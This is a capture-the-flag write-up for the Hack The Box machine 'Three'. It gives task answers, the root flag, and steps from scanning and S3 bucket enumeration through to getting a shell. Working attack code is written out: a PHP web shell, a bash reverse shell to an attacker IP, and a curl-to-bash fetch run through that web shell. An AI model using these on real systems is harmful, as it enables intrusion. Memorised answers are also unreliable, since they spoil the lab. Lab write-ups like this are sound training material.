# Tasks
- How many TCP ports are open?
	- 2
- What is the domain of the email address provided in the "Contact" section of the website?
	- thetoppers.htb
- In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
	- /etc/hosts
- Which sub-domain is discovered during further enumeration?
	- s3.thetoppers.htb
- Which service is running on the discovered sub-domain?
	- Amazon s3
- Which command line utility can be used to interact with the service running on the discovered sub-domain?
	- awscli
- Which command is used to set up the AWS CLI installation?
	- aws configure
- What is the command used by the above utility to list all of the S3 buckets?
	- aws s3 ls
- This server is configured to run files written in what web scripting language?
	- php
- Submit root flag
	- a980d99281a28d638ac68b9bf9453c2b


# Steps
- First, let's run rustscan to see what we are dealing with.
```
rustscan --ulimit 5000 --addresses "10.129.227.248" --top -- -sC -sV
```
- From the results, we have an SSH and web server running on the machine
```
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 178bd425452a20b879f8e258d78e79f4 (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCitBp4qe2+WEqMGa7+L3eEgbrqD/tH3G5PYsQ9nMFx6Erg9Rp+jn7D9QqC9GqKdraCCUQTzVoW3zqEd83Ef4iWR7VXjTb469txJU+Y8XlG/4JzegbjO6WYyfQTtQ3nLkqpa21BZEdH9ap28mcJAggj4/uHTiA3yTgZ2C+zPA6LoIS7CaB1DPK2q/8wrxDiRNv4gG  
iSjcxEilpL8Qls4R3Ny3QJD89hvgEdV9zapTS5T9hOfUdwbkElabjrWL4zs/E+cyHSZF5pPREiv6QkdMmk7cvMND5epXA29womDuabJsDLhrFYFecJxDmXhv6yspRAemCewOX+GnWckerKYeOf  
|   256 e60f1af6328a40ef2da73b22d1c714fa (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEkEPksFeIH9z6Ds6r7s2Uff45kDk/PEnvXYwP0ny6pKsP2s62W3PZVCywfF3aC8ONsAqQh6zy0s44Zv8B8g+rI=  
|   256 2de1874175f391544116b72b80c68f05 (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwGMkF/JG8KPrh19vLPmhe+RC0WBQt06gh1zE3EOo2q  
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))  
|_http-title: The Toppers  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
```
- This means there is a website to visit, which is thetoppers.htb.
- Visiting it, it appears to be for a band
- Nothing else appears to jump out at us, so let's go ahead and see if gobuster finds anything, but we'll look for subdomains instead of directories
```
gobuster vhost -u "http://thetoppers.htb" -w `fzf-wordlists`
```
- From here, we can confirm the existence of an s3 instance at s3.thetoppers.htb
- So, we can take advantage of awscli to connect to that instance.
- First, we need to configure using: aws configure
- Now, we can interact with the endpoint
```
[Nov 23, 2025 - 13:07:49 (PST)] exegol-htb-starting-point /workspace # aws --endpoint=http://s3.thetoppers.htb s3 ls                                 
2025-11-23 12:55:56 thetoppers.htb
```
- Using this, we could run a cp command so that we can upload a PHP reverse shell and take advantage of that
- Here's the shell we can use
```
<?php system($_GET["cmd"]); ?>
```
- We can then upload that
```
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```
- After uploading that, we can visit http://thetoppers.htb/shell.php?cmd="command" to run commands on the machine.
- So, let's create our verse shell script
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.21/1337 0>&1
```
- We can then use netcat to run a listener to capture that
```
nc -nvlp 1337
```
- We can then download it onto the machine and run it
```
http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.21:8000/shell.sh|bash
```
- A shell is then popped onto the machine
- From that, we are able to get the flag out from /var/www
```
www-data@three:/var/www/html$ cd ..  
cd ..  
www-data@three:/var/www$ ls  
ls  
flag.txt  
html  
www-data@three:/var/www$ cat flag.txt  
cat flag.txt  
a980d99281a28d638ac68b9bf9453c2b
```
